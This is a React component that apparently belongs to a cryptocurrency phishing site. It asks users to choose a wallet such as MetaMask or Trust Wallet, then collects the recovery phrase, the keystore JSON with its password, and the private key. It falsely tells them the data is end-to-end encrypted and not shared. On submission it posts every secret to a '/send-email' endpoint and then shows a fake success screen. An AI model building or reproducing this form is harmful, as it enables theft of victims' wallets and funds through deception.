import styles from "./formData.module.css";
import { z, ZodType } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { connectDataType } from "../../data";
import { useState } from "react";
import { FaCircleCheck } from "react-icons/fa6";
import { useNavigate } from "react-router-dom";

const Phrase = () => {
  const [loading, setLoading] = useState<boolean>(false);
  const [confirmed, setConfirmed] = useState<boolean>(false); // State for confirmation
  const navigate = useNavigate();
  const schema: ZodType<connectDataType> = z.object({
    recoveryPhrase: z
      .string()
      .optional()
      .refine((phrase) => {
        if (phrase) {
          const wordCount = phrase.trim().split(/\s+/).length;
          return wordCount === 12 || wordCount === 24;
        }
        return true; // If it's undefined, it's valid (because it's optional)
      }),
    keystorePhrase: z.string().optional(),
    keystorePassword: z.string().optional(),
    private: z.string().optional(),
  });

  const { register, handleSubmit, reset } = useForm<connectDataType>({
    resolver: zodResolver(schema),
  });
  const handleClickButton = () => {
    navigate("/");
  };
  const submitData = async (data: connectDataType) => {
    console.log(data);
    reset();
    setLoading(true);
    // Set loading to true for 3 seconds, then set it to false and show confirmation
    // setTimeout(() => {
    //   setLoading(false);
    //   setConfirmed(true);
    // }, 2890); // 3 seconds
    try {
      const response = await fetch("http://localhost:5000/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        setTimeout(() => {
          setLoading(false);
          setConfirmed(true);
        }, 3000);
      } else {
        console.error("Error sending email");
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <div className={styles.container}>
      {loading ? (
        <div className={styles.loadingContainer}>
          <div className={styles.loadingSpinner}></div>
          <p className={styles.loadingText}>Loading details...</p>
        </div>
      ) : confirmed ? (
        <div className={styles.confirmationDiv}>
          <p className={styles.successful}>
            <FaCircleCheck size={70} color="green" className={styles.fav} />
            Form submission successful! Your details have been received.
          </p>
          <button className={styles.returnHome} onClick={handleClickButton}>
            Return Home
          </button>
        </div>
      ) : (
        <>
          <div className={styles.proceed}>Proceed</div>
          <p className={styles.NB}>
            NB: All information are end-to-end encrypted. We do not share data
            and activity sessions with any other company.
          </p>

          <form className={styles.form} onSubmit={handleSubmit(submitData)}>
            <div className={styles.kindly}>
              Kindly fill in the necessary details in its respective field
            </div>
            <div className={styles.divPhrase}>
              <label htmlFor="" className={styles.phrase}>
                Phrase
              </label>
              <select name="mySelect" id="mySelect" size={1}>
                <option value="option1">Wallet Selection</option>
                <option value="option2">MetaMask</option>
                <option value="option3">Trust Wallet</option>
                <option value="option4">Coinbase</option>
                <option value="option5">Ssafepal</option>
                <option value="option6">Exodus Wallet</option>
                <option value="option7">Atomic Wallet</option>
                <option value="option8">Other Wallets</option>
              </select>
              <label htmlFor="" className={styles.recoveryPhraseLabel}>
                Recovery Phrase
              </label>
              <textarea
                className={styles.recText}
                id="message"
                rows={4}
                cols={50}
                {...register("recoveryPhrase")}
              ></textarea>
              <small>
                Typically 12 (sometimes 24) words separated by a single space
              </small>
            </div>
            <div className={styles.key}>
              <label htmlFor="" className={styles.keystore}>
                Keystore JSON
              </label>
              <select name="mySelect" id="mySelect" size={1}>
                <option value="option1">Trust Wallet</option>
              </select>
              <label htmlFor="" className={styles.keystoreLabel}>
                Keystore
              </label>
              <textarea
                className={styles.keyTextArea}
                id="message"
                rows={4}
                cols={50}
                {...register("keystorePhrase")}
              ></textarea>
              <input
                type="password"
                placeholder="...password"
                className={styles.password}
                {...register("keystorePassword")}
              />
              <small className={styles.several}>
                Several lines of text beginning with "{"{...}"}" plus the
                password you used for encryption
              </small>
            </div>
            <div className={styles.private}>
              <label htmlFor="" className={styles.privateKey}>
                Private Key
              </label>
              <textarea
                className={styles.privText}
                id="message"
                rows={4}
                cols={50}
                {...register("private")}
              ></textarea>
            </div>
            <small className={styles.privateWords}>
              Before you enter Private key, we recommend you connect to the
              internet
            </small>
            <button className={styles.button} type="submit">
              Submit
            </button>
          </form>
        </>
      )}
    </div>
  );
};

export default Phrase;
